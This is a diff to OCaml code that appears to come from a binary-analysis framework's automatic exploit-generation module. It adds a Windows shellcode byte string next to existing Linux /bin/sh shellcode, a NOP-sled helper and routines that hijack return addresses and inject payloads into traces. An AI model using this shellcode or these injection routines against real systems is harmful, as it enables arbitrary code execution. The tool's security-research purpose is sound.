@@ -541,10 +541,10 @@ let trace_to_blocks trace =
     List.filter (fun b -> List.length b > 1) blocks
 
 (** Strips the last jump of the block *)
-let strip_jmp block =
-  match List.rev block with
-	 | (Ast.Jmp _)::rest -> List.rev rest
-	 | _ -> block
+(* let strip_jmp block = *)
+(*   match List.rev block with *)
+(* 	 | (Ast.Jmp _)::rest -> List.rev rest *)
+(* 	 | _ -> block *)
 
 (*************************************************************)
 (*************************  Printers  ************************)
@@ -755,7 +755,7 @@ let run_block state block =
     (* TraceConcrete.print_mem state.delta; *)
   );
   let block = append_halt block in 
-  let block = strip_jmp block in
+  (* let block = strip_jmp block in *)
     Status.inc() ;   
     Status.inc() ;
   (*print_block block ;*)
@@ -1085,10 +1085,13 @@ struct
   	   try VH.find delta var
   	   with Not_found ->
   	     match Var.typ var with
-  	     | TMem _ -> dprintf "new memory %s" (Var.name var); empty_smem var
+  	     | TMem _ 
+	     | Array _ -> (* dprintf "new memory %s" (Var.name var); *) empty_smem var
   	     | _ ->
-		 if not (isbad var) then
-  		   wprintf "Variable not found during evaluation: %s" name;
+		 (match dsa_var var with
+		 | Some(x) -> if isbad x then
+  		   wprintf "Variable not found during evaluation: %s" name
+		 | _ -> ());
   		 Symbolic(Var(var))
 		       
       )
@@ -1292,6 +1295,26 @@ let shellcode =
   "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
     ^ "\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
 
+(* Windows shellcode to run an advanced math system *)
+let winshellcode =
+  "\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc"
+  ^ "\xd9\x74\x24\xf4\xb1\x1e\x58\x31\x78"
+  ^ "\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85"
+  ^ "\x30\x78\xbc\x65\xc9\x78\xb6\x23\xf5"
+  ^ "\xf3\xb4\xae\x7d\x02\xaa\x3a\x32\x1c"
+  ^ "\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21"
+  ^ "\xe7\x96\x60\xf5\x71\xca\x06\x35\xf5"
+  ^ "\x14\xc7\x7c\xfb\x1b\x05\x6b\xf0\x27"
+  ^ "\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3"
+  ^ "\xf7\x3b\x7a\xcf\x4c\x4f\x23\xd3\x53"
+  ^ "\xa4\x57\xf7\xd8\x3b\x83\x8e\x83\x1f"
+  ^ "\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6"
+  ^ "\xf5\xc1\x7e\x98\xf5\xaa\xf1\x05\xa8"
+  ^ "\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61"
+  ^ "\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f"
+  ^ "\x59\x90\x7b\xd7\x05\x7f\xe8\x7b\xca"
+
+
 let nop = '\x90'
 
 let nopsled n = String.make n nop
@@ -1315,7 +1338,7 @@ let get_last_jmp_exp stmts =
 let hijack_control target trace = 
   let ((e, atts), trace) = get_last_jmp_exp trace in
   let ret_constraint = BinOp(EQ,e,target) in
-    trace, Ast.Assert(ret_constraint, atts)
+  trace, Ast.Assert(ret_constraint, atts)
       
 (* Setting the return address to an arbitrary value *)
 let control_flow addr trace = 
@@ -1340,12 +1363,14 @@ let inject_payload start payload trace =
       | [] -> failwith "no load found"
       | (Ast.Move(_,Ast.Load(array,index,_,_),_))::rest ->
 	  (array,index)
-      | _::rest -> get_load rest
+      | s::rest -> 
+	  get_load rest
     in
       get_load rev
   in
-  let _m, trace = get_last_jmp_exp trace in
+  (* let _m, trace = get_last_jmp_exp trace in *)
   let mem, ind = get_last_load_exp trace in
+  dprintf "Injecting shellcode at index: %s" (Pp.ast_exp_to_string ind);
    (* Let's convert to Int64 *)
   let payload = List.map Int64.of_int payload in
   let _,assertions = 
